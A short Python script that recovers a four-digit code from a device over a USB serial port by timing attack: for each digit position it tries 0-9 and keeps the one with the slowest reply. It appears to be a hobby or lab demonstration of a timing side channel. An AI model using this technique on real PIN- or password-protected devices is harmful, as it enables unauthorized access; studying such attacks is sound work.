import serial
import time

numbers = [
  4000,
  2000,
  1000,
  2000,
  5000,
  5700,
  5780,
  5789,
]

with serial.Serial('/dev/cu.usbmodem14101', 9600, timeout=1) as ser:
  ser.write(b'aaa')
  ser.read(28)
  ser.write(b'aaa')
  ser.read(28)

  prefix = b''

  attack_start = time.time()

  # 3, 2, 1, 0
  for suffix_size in range(3, -1, -1):
    suffix = b'0' * suffix_size
    times = {}

    for i in range(10):
      value = prefix + str(i).encode('utf-8') + suffix
      print(value)
      ser.write(value)
      start = time.time()
      out = ser.read(28)
      times[i] = time.time() - start

    number = max(times.keys(), key=lambda e: times[e])

    prefix += str(number).encode('utf-8')


print(f'{prefix.decode()} found in {time.time() - attack_start}s.')
